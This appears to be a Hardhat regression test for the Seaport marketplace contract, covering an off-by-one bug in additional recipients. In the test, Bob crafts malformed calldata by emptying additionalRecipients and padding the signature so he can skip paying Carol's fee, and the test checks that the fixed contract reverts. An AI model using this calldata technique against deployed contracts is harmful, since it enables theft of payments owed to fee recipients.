import { expect } from "chai";
import { constants, Wallet } from "ethers";
import {
  ConsiderationInterface,
  TestERC20,
  TestERC721,
} from "../../typechain-types";
import { buildOrderStatus, getBasicOrderParameters } from "../utils/encoding";
import { seaportFixture, SeaportFixtures } from "../utils/fixtures";
import { getWalletWithEther } from "../utils/impersonate";
import { AdvancedOrder, ConsiderationItem } from "../utils/types";
import { getScuffedContract } from "scuffed-abi";
import { hexZeroPad } from "ethers/lib/utils";
import { network } from "hardhat";

const IS_FIXED = true;

describe("Additional recipients off by one error allows skipping second consideration", async () => {
  let alice: Wallet;
  let bob: Wallet;
  let carol: Wallet;
  let order: AdvancedOrder;
  let orderHash: string;
  let testERC20: TestERC20;
  let testERC721: TestERC721;
  let marketplaceContract: ConsiderationInterface;
  let mintAndApprove721: SeaportFixtures["mintAndApprove721"];
  let mintAndApproveERC20: SeaportFixtures["mintAndApproveERC20"];
  let getTestItem20: SeaportFixtures["getTestItem20"];
  let getTestItem721: SeaportFixtures["getTestItem721"];
  let createOrder: SeaportFixtures["createOrder"];

  after(async () => {
    await network.provider.request({
      method: "hardhat_reset",
    });
  });

  before(async function () {
    if (process.env.REFERENCE) {
      this.skip();
    }
    alice = await getWalletWithEther();
    bob = await getWalletWithEther();
    carol = await getWalletWithEther();
    ({
      mintAndApprove721,
      mintAndApproveERC20,
      marketplaceContract,
      getTestItem20,
      getTestItem721,
      createOrder,
      testERC20,
      testERC721,
    } = await seaportFixture(await getWalletWithEther()));
    // ERC721 with ID = 1
    await mintAndApprove721(alice, marketplaceContract.address, 1);
    // ERC20 with amount = 1100
    await mintAndApproveERC20(bob, marketplaceContract.address, 1100);
  });

  it("Alice offers to sell an NFT for 1000 DAI plus 100 in fees for Carol", async () => {
    const offer = [getTestItem721(1, 1, 1)];

    const consideration: ConsiderationItem[] = [
      getTestItem20(1000, 1000, alice.address),
      getTestItem20(100, 100, carol.address),
    ];

    const results = await createOrder(
      alice,
      constants.AddressZero, // zone
      offer,
      consideration,
      0, // FULL_OPEN
      [], // criteria
      null, // timeFlag
      alice, // signer
      constants.HashZero, // zoneHash
      constants.HashZero, // conduitKey
      true // extraCheap
    );
    order = results.order;
    orderHash = results.orderHash;

    // OrderStatus is not validated
    let orderStatus = await marketplaceContract.getOrderStatus(orderHash);
    expect({ ...orderStatus }).to.deep.equal(
      buildOrderStatus(false, false, 0, 0)
    );

    // Bob validates the order
    await expect(marketplaceContract.connect(bob).validate([order]))
      .to.emit(marketplaceContract, "OrderValidated")
      .withArgs(orderHash, alice.address, constants.AddressZero);

    // OrderStatus is validated
    orderStatus = await marketplaceContract.getOrderStatus(orderHash);
    expect({ ...orderStatus }).to.deep.equal(
      buildOrderStatus(true, false, 0, 0)
    );
  });

  describe("Bob attempts to fill the order without paying Carol", () => {
    let maliciousCallData: string;

    before(async () => {
      // True Parameters
      const basicOrderParameters = getBasicOrderParameters(
        2, // ERC20ForERC721
        order
      );

      basicOrderParameters.additionalRecipients = [];
      basicOrderParameters.signature = basicOrderParameters.signature
        .slice(0, 66)
        .concat(hexZeroPad("0x", 96).slice(2));
      const scuffedContract = getScuffedContract(marketplaceContract);
      const scuffed = scuffedContract.fulfillBasicOrder({
        parameters: basicOrderParameters,
      });
      scuffed.parameters.signature.length.replace(100);
      scuffed.parameters.signature.tail.replace(carol.address);

      maliciousCallData = scuffed.encode();
    });

    if (!IS_FIXED) {
      it("Bob fulfills Alice's order using maliciously constructed calldata", async () => {
        await expect(
          bob.sendTransaction({
            to: marketplaceContract.address,
            data: maliciousCallData,
          })
        ).to.emit(marketplaceContract, "OrderFulfilled");
      });

      it("Bob receives Alice's NFT, having paid 1000 DAI", async () => {
        expect(await testERC721.ownerOf(1)).to.equal(bob.address);
        expect(await testERC20.balanceOf(bob.address)).to.equal(100);
      });

      it("Alice receives 1000 DAI", async () => {
        expect(await testERC20.balanceOf(alice.address)).to.equal(1000);
      });

      it("Carol does not receive her DAI", async () => {
        expect(await testERC20.balanceOf(carol.address)).to.equal(0);
      });
    } else {
      it("Bob attempts to fulfill Alice's order with malicious calldata, but the transaction reverts", async () => {
        await expect(
          bob.sendTransaction({
            to: marketplaceContract.address,
            data: maliciousCallData,
          })
        ).to.be.revertedWith("MissingOriginalConsiderationItems");
      });
    }
  });
});
